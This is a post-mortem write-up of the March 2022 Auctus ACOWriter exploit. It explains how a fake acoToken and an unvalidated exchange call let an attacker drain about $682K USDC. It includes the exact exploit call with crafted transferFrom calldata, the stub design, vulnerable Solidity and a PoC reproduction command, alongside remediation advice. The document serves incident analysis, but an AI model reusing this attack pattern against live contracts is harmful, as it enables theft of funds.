# Auctus (ACO) Exploit — `ACOWriter` Trusts Attacker-Supplied `acoToken` + Arbitrary `exchange` Call

> **Vulnerability classes:** vuln/logic/missing-validation · vuln/dependency/unsafe-external-call · vuln/access-control/untrusted-input

> **Reproduction:** the PoC compiles & runs in an isolated Foundry project at
> [this project folder](.). Full verbose trace: [output.txt](output.txt).
> Verified vulnerable source: [ACOWriter.sol](sources/ACOWriter_E7597F/ACOWriter.sol),
> [ERC20Proxy.sol](sources/ERC20Proxy_95E6F4/ERC20Proxy.sol).

---

## Key info

| | |
|---|---|
| **Loss** | ~$682K USDC pulled from the ACO protocol's collateral/escrow holder (`0xCB32…993B`) |
| **Vulnerable contract** | `ACOWriter` — [`0xE7597F774fD0a15A617894dc39d45A28B97AFa4f`](https://etherscan.io/address/0xE7597F774fD0a15A617894dc39d45A28B97AFa4f#code) |
| **0x ERC20Proxy (legit path)** | `0x95E6F48254609A6ee006F7D493c8e5fB97094ceF` |
| **Attacker** | this test contract (anyone) |
| **Chain / block / date** | Ethereum mainnet / 14,460,635 / Mar 2022 |
| **Bug class** | Untrusted input + missing validation — `ACOWriter.write` accepts arbitrary `acoToken` (trusts `collateral()`/`strikeAsset()`/`mint*`/`balanceOf`/`approve`/`transfer`) **and** attacker-controlled `exchangeAddress` + raw `exchangeData` for a low-level call. |

---

## TL;DR

Attacker passes **itself** as `acoToken` (implements minimal `IACOToken` surface):

- `collateral()` → `address(0)` (takes 1-wei ETH "mint" branch)
- `strikeAsset()` → `address(this)` (fake strike transfer)
- All other methods stub success

Call:

```solidity
acowrite.write{value: 1}(
    address(this), 1,
    address(usdc),
    abi.encodeWithSelector(transferFrom.selector, 0xCB32…993B, msg.sender, usdc.balanceOf(0xCB32…))
);
```

In `write` → `_sellACOTokens`:

```solidity
address _collateral = IACOToken(acoToken).collateral(); // 0
if (_isEther(_collateral)) { IACOToken(acoToken).mintToPayable{value:1}(msg.sender); }

uint256 acoBalance = _balanceOfERC20(acoToken, address(this));
_approveERC20(acoToken, erc20proxy, acoBalance);           // on fake

(bool success,) = _exchange.call{value: address(this).balance}(exchangeData);
// _exchange == USDC → USDC.transferFrom(VICTIM, attacker, 682255200072)
// executes with msg.sender == ACOWriter (which held allowance)

address token = IACOToken(acoToken).strikeAsset(); // self
_transferERC20(token, msg.sender, ...);                    // fake
```

Logs: `After exploit, USDC balance of attacker: 682255200072`

**Note on ERC20Proxy**: Only a harmless `approve(fake, proxy, 1)` touches it. The drain is a direct call to the USDC contract via the unauthenticated exchange path.

---

## Root cause

1. No validation that `acoToken` is a genuine ACO deployment. All IACOToken methods are called on attacker-controlled code.
2. `setExchange` + `_exchange.call{value:...}(exchangeData)` is completely open — intended for 0x sales of minted ACOs but usable for arbitrary actions while the writer context (balances + approvals) is live.

Pre-existing user approvals `USDC.approve(ACOWriter, ...)` (required for the legitimate ERC20-collateral `write` path) become the spending authority for the attacker-controlled transferFrom.

---

## Vulnerable Functions (ACOWriter.sol)

```solidity
function write(address acoToken, uint256 collateralAmount, address exchangeAddress, bytes memory exchangeData)
    nonReentrant setExchange(exchangeAddress) public payable
{
    require(msg.value > 0 && collateralAmount > 0);
    address _collateral = IACOToken(acoToken).collateral();
    if (_isEther(_collateral)) {
        IACOToken(acoToken).mintToPayable{value: collateralAmount}(msg.sender);
    } else { /* ERC20 collateral path using caller approvals */ ... }
    _sellACOTokens(acoToken, exchangeData);
}

function _sellACOTokens(address acoToken, bytes memory exchangeData) internal {
    uint256 acoBalance = _balanceOfERC20(acoToken, address(this));
    _approveERC20(acoToken, erc20proxy, acoBalance);
    (bool success,) = _exchange.call{value: address(this).balance}(exchangeData);
    require(success, "...");
    address token = IACOToken(acoToken).strikeAsset();
    ... _transferERC20(token, msg.sender, ...) ...
    if (address(this).balance > 0) msg.sender.transfer(...);
}
```

(See full source in `sources/ACOWriter_E7597F/ACOWriter.sol` + `IACOToken.sol`.)

---

## Exploit Steps

1. Attacker contract implements lying `collateral()=0`, `strikeAsset()=self`, success stubs for mint/balance/approve/transfer.
2. Call `write{value:1}(self, 1, USDC, transferFrom(VICTIM, attacker, amt))`.
3. Writer follows ETH branch (1 wei), fakes balances/approves, performs the attacker-supplied call (USDC transferFrom succeeds because caller==ACOWriter), fakes strike transfer.
4. Attacker receives funds.

---

## Preconditions

- ACOWriter reachable.
- Target holder has non-zero USDC balance + prior `approve(ACOWriter, X)`.
- 1 wei available.

---

## Remediation

- Whitelist `acoToken` from official factory.
- Do not derive token movement targets or perform arbitrary calls from untrusted `acoToken` / `exchange*` inputs.
- Restrict `exchangeAddress` (or remove raw call) and validate `exchangeData`.
- Prefer exact-amount approvals or permit flows.

---

## How to reproduce

```bash
_shared/run_poc.sh 2022-03-Auctus_exp -vvvvv
```

Result: `[PASS] test()` + attacker USDC balance = 682255200072.

Full trace in `output.txt`. Also see `test/Auctus.sol` (standalone `AuctusDrain`).

---

*Reference: Auctus ACO ACOWriter untrusted acoToken + exchange call, Mar 2022.*